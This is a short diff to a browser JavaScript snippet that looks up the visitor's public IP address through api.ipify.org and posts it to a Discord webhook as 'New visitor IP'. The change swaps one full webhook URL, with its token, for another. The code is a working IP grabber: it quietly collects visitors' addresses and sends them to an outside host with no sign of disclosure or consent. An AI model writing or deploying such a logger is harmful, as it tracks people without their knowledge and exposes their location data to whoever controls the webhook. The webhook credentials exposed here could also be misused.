@@ -1,4 +1,3 @@
-// Fetch the IP address using a public API
 fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
@@ -9,7 +8,7 @@ fetch('https://api.ipify.org?format=json')
 
 // Function to send the IP address to the Discord webhook
 function sendToDiscord(ip) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1256629643147214848/S_KlGZ0aHncGM9OTqdj6zg4Nh9DGbnVfGWsJk-R8jN5NVnbZs3ck56bv3vRPHZx5EI_b';
+    const webhookUrl = 'https://discord.com/api/webhooks/1256894094580514906/zQSv1ldNGF56b36sa2-bDhbGswK6Fgc7uR6F5NB4LtCS4pFBcm8OVfaWumYfpzM2nyI1';
     const payload = {
         content: `New visitor IP: ${ip}`
     };
